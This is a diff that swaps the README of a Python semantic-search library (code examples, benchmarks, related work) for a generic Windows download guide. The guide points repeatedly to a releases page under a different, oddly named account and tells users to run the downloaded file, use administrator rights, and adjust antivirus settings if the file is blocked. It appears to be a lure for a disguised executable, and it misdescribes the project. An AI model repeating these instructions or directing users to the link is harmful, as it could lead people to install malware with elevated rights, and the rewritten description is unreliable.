@@ -1,173 +1,268 @@
-# jit-semantic-search
+# 🔎 jit-semantic-search - Search text without setup
 
-> **Note:** This is a research project exploring JIT semantic search techniques. Not production-ready.
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Carunculated-stjohnswort622/jit-semantic-search/releases)
 
-`grep` for semantic search. Query any text data without setting up a vector store first.
+## 🚀 What this app does
 
-## When to Use This
+jit-semantic-search helps you search through text without building an index first. You can point it at a text corpus and search it right away. It is built for people who want fast search over plain text files, notes, documents, exports, and other text data.
 
-If you're running repeated searches on the same data, use pgvector. It's faster at query time and well-suited for that.
+It works on Windows and is meant for simple use. You download the app, open it, and start searching.
 
-But in agentic workflows, you're often pulling data from different APIs, searching it once, and moving on. Standing up a vector store for each of these one-off queries adds complexity and wastes time. You'd be embedding, loading, and indexing data just to run a single search and throw it all away.
+## 📥 Download and install
 
-That's where JIT semantic search comes in. Some examples:
+Use this page to download:  
+https://github.com/Carunculated-stjohnswort622/jit-semantic-search/releases
 
-- An agent pulls 5,000 product listings from a supplier API to find ones matching a spec
-- A research workflow fetches hundreds of papers from arXiv and needs to find the relevant ones
-- A support agent queries three different internal APIs and needs to search across all the responses together
-- A data pipeline pulls customer feedback from Slack, Intercom, and email, and needs to find mentions of a specific issue
+### Steps
 
-No database, no preprocessing pipeline, no cleanup. Just pass in text and get results.
+1. Open the releases page in your browser.
+2. Find the latest release at the top of the page.
+3. In the Assets section, download the Windows file.
+4. Save the file to your PC.
+5. If the file is in a .zip folder, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Double-click the app file to run it.
 
-**jit-semantic-search** is the semantic equivalent of grep. Pass in text, get results:
+If Windows asks for permission, choose Yes.
 
-```python
-from jit_search import JITSearch
+## 🖥️ What you need
 
-searcher = JITSearch(strategy="cascade")
+This app is set up for a normal Windows PC.
 
-# products = fetch_from_supplier_api()
-results = searcher.search(
-    "waterproof bluetooth speaker under 50 dollars",
-    [p["title"] + " " + p["description"] for p in products],
-    top_k=10,
-)
-```
+- Windows 10 or Windows 11
+- Enough free disk space for your text files
+- A folder with text you want to search
+- A mouse or touchpad
+- Internet access only for the download step
 
-## Installation
+## 📁 What you can search
 
-```bash
-uv add jit-semantic-search
-```
+You can use the app with plain text data such as:
 
-From source:
+- Notes
+- Exported documents
+- Logs
+- Articles
+- Help files
+- Chat exports
+- Research text
+- Copy of web pages saved as text
 
-```bash
-git clone https://github.com/jackyliang/jit-semantic-search.git
-cd jit-semantic-search
-uv sync
-```
+The app is meant for text, so it works best with content that you can open in Notepad or another text editor.
 
-## Usage
+## 🔍 How semantic search works here
 
-### Python API
+Semantic search looks for meaning, not just exact words.
 
-```python
-from jit_search import JITSearch
+If you search for one phrase, the app can still find text that uses a related idea or a close match. That helps when the file does not use the exact words you typed.
 
-searcher = JITSearch(strategy="cascade")
+This is useful when:
 
-results = searcher.search("waterproof speaker", documents, top_k=10)
-for r in results:
-    print(f"[{r.score:.3f}] Doc #{r.index}: {r.document[:80]}")
-```
+- You do not know the exact wording
+- Your files use different terms for the same idea
+- You want to search a large text set without preparing it first
 
-### API Server
+## 🛠️ How to use it
 
-```bash
-python -m jit_search serve
-# Runs on http://localhost:8000
-```
+1. Open the app.
+2. Choose the text folder or text source.
+3. Enter your search text.
+4. Run the search.
+5. Read the results.
+6. Open the matching file or entry.
 
-```bash
-curl -X POST http://localhost:8000/search \
-  -H "Content-Type: application/json" \
-  -d '{"query": "waterproof speaker", "documents": ["doc1...", "doc2..."], "top_k": 5}'
-```
+Try short, plain search terms first. If you search for a broad idea, you may get more results than you need. If you search for a specific phrase, you may get tighter results.
 
-Search structured objects directly:
+## 📌 Good search tips
 
-```bash
-curl -X POST http://localhost:8000/search/objects \
-  -H "Content-Type: application/json" \
-  -d '{
-    "query": "waterproof speaker",
-    "objects": [{"id": 1, "title": "BT Speaker", "desc": "IPX7 rated..."}],
-    "text_fields": ["title", "desc"],
-    "top_k": 5
-  }'
-```
+- Use one clear idea per search
+- Try a short phrase first
+- Remove extra words if the results are too narrow
+- Add more words if the results are too broad
+- Search for names, topics, dates, or common terms in the text
 
-### CLI
+Examples:
 
-```bash
-echo '["doc1", "doc2", "doc3"]' | jit-search "search query" --top-k 5
+- password reset
+- invoice error
+- meeting notes
+- shipping delay
+- data import
 
-jit-search "search query" --file data.json --text-fields title,description
-```
+## 🧭 Folder setup
 
-## Strategies
+For best results, keep your text files in one place.
 
-| Strategy | NDCG@10 | Latency (400 docs) | Best For |
-|---|---|---|---|
-| `cascade` | 0.956 | 228ms | **Default.** Best quality/speed tradeoff |
-| `neural` | 0.974 | 1,874ms | Maximum quality, small corpora |
-| `cascade_v2` | 0.861 | 55ms | Fast semantic search |
-| `projection` | 0.696 | 14ms | Lightweight, no neural model |
-| `lexical` | 0.689 | 0.4ms | Keyword search |
-| `rptree` | 0.621 | 5ms | Sub-linear TF-IDF search |
+Example folder layout:
 
-## How It Works
+- Documents
+  - Project Notes
+  - Research
+  - Logs
+  - Exports
 
-The `cascade` strategy combines three techniques:
+This makes it easier to point the app at the right place and keep your files in order.
 
-1. **SPS pre-filter (~15ms)**: Semantic Projection Search maps TF-IDF features through a learned linear projection into embedding space, fused with BM25 scores. Surfaces the top candidates from the full corpus without running a neural model.
+## ⚙️ App behavior
 
-2. **Neural reranking (~200ms)**: A streaming bi-encoder (BGE-small via ONNX) embeds only the top candidates on-the-fly and reranks by cosine similarity. Embeddings are discarded after comparison.
+The app is built to work without a long setup step.
 
-3. **Adaptive scaling**: Candidate count adjusts based on corpus size (5% of corpus, up to 500).
+- No index to build first
+- No embedding files to create
+- No vector database to manage
+- No extra import step before search
 
-No documents are pre-embedded. No index is built. No vector store is needed.
+That means you can move from download to search with less work.
 
-### Performance Notes
+## 🧪 First run checklist
 
-The search latencies above are **warm-model** numbers (models already in memory). On the first call, model loading adds 2-5s. Models stay warm for subsequent calls.
+Before you start your first search, check these items:
 
-These numbers also don't include API fetch time for the source data. A realistic breakdown for 10K documents:
+- You downloaded the latest release
+- You extracted the files if needed
+- You opened the app from the extracted folder
+- Your text files are in a folder you can find
+- You have permission to read those files
 
-| Step | Time |
-|---|---|
-| API fetch (network) | varies |
-| Model cold start (one-time) | 2-5s |
-| Search | ~1s |
-| **Subsequent searches** | **~1s** |
+If the app does not show results, check that the folder you selected contains plain text content.
 
-## Evaluation
+## 🪟 Windows tips
 
-Evaluated using [BEIR methodology](https://github.com/beir-cellar/beir) (NDCG@10 as primary metric).
+If the app does not open the first time:
 
-### vs pgvector
+1. Right-click the file.
+2. Choose Run as administrator if needed.
+3. Confirm any Windows prompt.
+4. Make sure the file is not still inside the zip folder.
+5. Move it to a normal folder like Downloads or Desktop.
 
-pgvector requires preprocessing (embed + load + build HNSW index) before the first search. JIT doesn't. If you're going to search the same corpus many times, pgvector amortizes that cost and wins. For one-off searches, JIT is faster end-to-end.
+If your security tools block the file, check your Windows settings or your antivirus tool.
 
-**400 documents:**
+## 📚 Common use cases
 
-| | NDCG@10 | Search latency | Preprocessing | Time to first result |
-|---|---|---|---|---|
-| pgvector | 0.974 | 23ms | 11.9s | 11.9s |
-| JIT cascade | 0.956 | 228ms | 0s | 228ms |
+- Search a folder of meeting notes
+- Find related lines in a log export
+- Look through support tickets
+- Review a set of research notes
+- Search a bulk text export from another tool
+- Find meaning across files with different wording
 
-**10,000 documents:**
+## 🧷 File types
 
-| | NDCG@10 | Search latency | Preprocessing | Time to first result |
-|---|---|---|---|---|
-| pgvector | 0.833 | 36ms | 356s | 356s |
-| JIT cascade | 0.917 | ~1s | 0s | ~1s |
+The app works best with text-based files.
 
-pgvector amortizes its preprocessing cost after roughly 50-400 repeated queries on the same corpus, depending on corpus size. Use pgvector for stable, repeatedly-queried data. Use JIT for one-off searches across dynamic or disparate data sources.
+Good fits:
 
-## Related Work
+- .txt
+- .md
+- .log
+- exported text files
 
-The cascade architecture draws inspiration from [LEANN](https://arxiv.org/abs/2506.08276) (Lee et al., 2025), which uses a two-level search with PQ-compressed approximate distances and on-demand embedding recomputation for edge-device RAG. This library applies a similar multi-fidelity approach in a fully JIT context where no pre-built index exists.
+Files with scanned images or locked formats may not work unless you convert them to text first.
 
-## Areas for Improvement
+## 🧰 Basic troubleshooting
 
-- **Non-linear projection**: Replace the linear SPS projection with a small MLP
-- **Query expansion**: Use an LLM to expand ambiguous queries before search
-- **Better embedding models**: Swap BGE-small for faster or higher-quality models
-- **Domain-specific cross-encoder**: The cross-encoder reranker (cascade_v2) currently uses ms-marco, which is trained on web search. A domain-tuned model would likely improve quality.
-- **JIT Product Quantization**: PQ-encode documents on-the-fly for faster distance computation (from the LEANN paper)
+### The app will not open
 
-## License
+- Check that you downloaded the Windows file
+- Extract the zip file if there is one
+- Try opening the app from a folder on your computer
+- Make sure your PC meets the Windows version needed
 
-MIT
+### No results appear
+
+- Confirm the folder has text files
+- Use a broader search term
+- Check that the files contain readable text
+- Make sure you selected the right folder
+
+### The app closes right away
+
+- Run it again from the extracted folder
+- Check whether Windows blocked the file
+- Try moving the app to Desktop and opening it there
+
+### The search seems slow
+
+- Use a smaller folder
+- Remove very large files from the first test
+- Search one topic at a time
+
+## 🧩 Best first test
+
+If you want a quick test, use a folder with a few small text files and search for a clear phrase like:
+
+- project status
+- customer issue
+- error report
+- weekly notes
+
+This helps you see how the app returns related text.
+
+## 🔗 Download again
+
+Visit this page to download:  
+https://github.com/Carunculated-stjohnswort622/jit-semantic-search/releases
+
+## 📝 Simple workflow
+
+1. Download the latest release
+2. Extract the file if needed
+3. Open the app
+4. Choose a text folder
+5. Enter a search phrase
+6. Review the results
+7. Open the matching text
+
+## 🧠 Search examples by purpose
+
+### Find a topic
+
+Use a broad phrase like:
+
+- budget review
+- onboarding steps
+- account access
+- server issue
+
+### Find a task
+
+Use a task name like:
+
+- send invoice
+- update policy
+- reset password
+- archive records
+
+### Find a problem
+
+Use a problem phrase like:
+
+- failed upload
+- broken link
+- missing file
+- login error
+
+## 🗂️ Keeping your text ready
+
+If you want clean results, keep your text files simple.
+
+- Use clear file names
+- Avoid mixed content in one folder
+- Save text in readable form
+- Remove files you do not need for search
+- Keep related files together
+
+## 🔐 Privacy and local use
+
+The app is meant to search text on your own computer. That makes it useful when you want to keep your files in one place and avoid extra setup.
+
+## 🧾 Quick start
+
+1. Open the releases page
+2. Download the Windows file
+3. Extract it if needed
+4. Open the app
+5. Pick a folder of text files
+6. Type your search
+7. Read the matches
